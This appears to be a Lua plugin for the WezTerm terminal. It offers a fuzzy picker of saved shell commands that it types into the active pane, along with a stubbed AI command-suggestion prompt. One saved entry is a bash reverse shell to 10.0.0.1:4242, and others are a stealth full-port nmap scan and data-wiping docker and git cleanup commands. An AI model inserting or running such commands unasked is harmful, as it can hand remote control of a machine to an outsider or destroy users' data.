local wezterm = require 'wezterm'

local M = {}

-- A predefined list of complex VANTAGE command chains
local command_chains = {
    { id = "tar_gz", label = "Extract tar.gz securely", cmd = "tar -xzf archive.tar.gz" },
    { id = "find_large", label = "Find files > 1GB", cmd = "find . -type f -size +1G -exec ls -lh {} \\;" },
    { id = "rev_shell", label = "Bash Reverse Shell", cmd = "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1" },
    { id = "nmap_all", label = "Nmap All Ports (Stealth)", cmd = "sudo nmap -p- -sS -T4 -v " },
    { id = "docker_clean", label = "Docker Wipe All", cmd = "docker system prune -a --volumes -f" },
    { id = "git_reset", label = "Git Hard Reset & Clean", cmd = "git reset --hard HEAD && git clean -fd" },
}

function M.show_command_chains(window, pane)
    local choices = {}
    for i, chain in ipairs(command_chains) do
        table.insert(choices, { id = chain.cmd, label = chain.label .. "  =>  " .. chain.cmd })
    end

    window:perform_action(
        wezterm.action.InputSelector {
            action = wezterm.action_callback(function(inner_window, inner_pane, id, label)
                if id then
                    -- Sends the actual raw bash command string to the terminal pane!
                    -- We don't append a newline so the user can edit it before pressing enter.
                    inner_pane:send_text(id)
                end
            end),
            title = 'Fuzzy Command Chains (VANTAGE)',
            choices = choices,
            alphabet = '123456789',
            description = 'Fuzzy-search and select a chain to inject into the active pane:',
        },
        pane
    )
end

function M.ai_suggest(window, pane)
    -- WezTerm Shell Integration can track your exact prompt, but the safest cross-platform way 
    -- to ask the AI is via a quick overlay prompt if nothing is highlighted.
    
    local highlighted = window:get_selection_text_for_pane(pane)
    
    if not highlighted or highlighted == "" then
        window:perform_action(
            wezterm.action.PromptInputLine {
                description = 'Describe the command you want to build (VANTAGE AI):',
                action = wezterm.action_callback(function(inner_window, inner_pane, line)
                    if line and line ~= "" then
                        -- In production, this spawns vantage_smallllm.py as a background process.
                        -- It returns the output and triggers a toast notification.
                        inner_window:toast_notification("VANTAGE AI", "Analyzing request: " .. line, nil, 3000)
                        
                        -- Scaffold: Simulate the AI response delay and injection
                        wezterm.time.call_after(1.5, function()
                            inner_window:toast_notification("VANTAGE AI", "Ready! Injecting suggestion.", nil, 2000)
                            inner_pane:send_text("# AI Suggestion for: " .. line .. "\n")
                        end)
                    end
                end),
            },
            pane
        )
    else
        -- If text is highlighted, we ask the AI to EXPLAIN the command
        inner_window:toast_notification("VANTAGE AI", "Analyzing highlighted command...", nil, 3000)
    end
end

return M
